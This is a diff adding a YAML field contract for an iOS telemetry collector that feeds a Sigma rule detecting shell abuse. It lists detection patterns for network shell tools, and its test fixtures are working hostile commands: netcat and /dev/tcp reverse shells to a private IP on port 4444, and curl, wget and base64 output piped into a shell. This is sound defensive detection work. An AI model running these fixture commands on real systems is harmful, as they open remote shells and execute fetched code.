@@ -1,0 +1,48 @@
+schema: ios.security_telemetry
+description: >
+  Field contract an iOS collector must populate so the shell-abuse Sigma
+  rule can evaluate. Values must come from instrumented telemetry; stock
+  iOS exposes no system-wide exec/argv stream.
+required_fields:
+  event.category:
+    type: keyword
+    required_value: process
+    source: instrumentation or EDR/MDM export
+  event.type:
+    type: keyword
+    allowed_values: [process_start, shell_command]
+    source: instrumentation or EDR/MDM export
+  command_line:
+    type: keyword
+    source: instrumented argv
+    note: not available on stock iOS; must be synthesized by the collector
+  fixture:
+    type: keyword
+    source: test harness only
+    note: marks synthetic events; exclude from production alerting
+signatures:
+  dev_tcp:
+    operator: contains
+    match: ['/dev/tcp/']
+    fixture_seq: 3
+    fixture_command: "bash -c 'exec 3<>/dev/tcp/10.0.0.9/4444; cat <&3'"
+  nc_exec:
+    operator: contains
+    match: ['nc -e ', 'nc -c ', 'ncat --exec', 'ncat -e ']
+    fixture_seq: 2
+    fixture_command: "nc -e /bin/sh 10.0.0.9 4444"
+  curl_pipe_shell:
+    operator: contains_all
+    match: ['curl', '| bash']
+    fixture_seq: 0
+    fixture_command: "curl https://test.invalid/payload | bash"
+  wget_pipe_shell:
+    operator: contains_all
+    match: ['wget', '| sh']
+    fixture_seq: 1
+    fixture_command: "wget -qO- https://test.invalid/p | sh"
+  base64_pipe_shell:
+    operator: contains_all
+    match: ['base64 -d', '| bash']
+    fixture_seq: 4
+    fixture_command: "echo aGVsbG8K | base64 -d | bash"
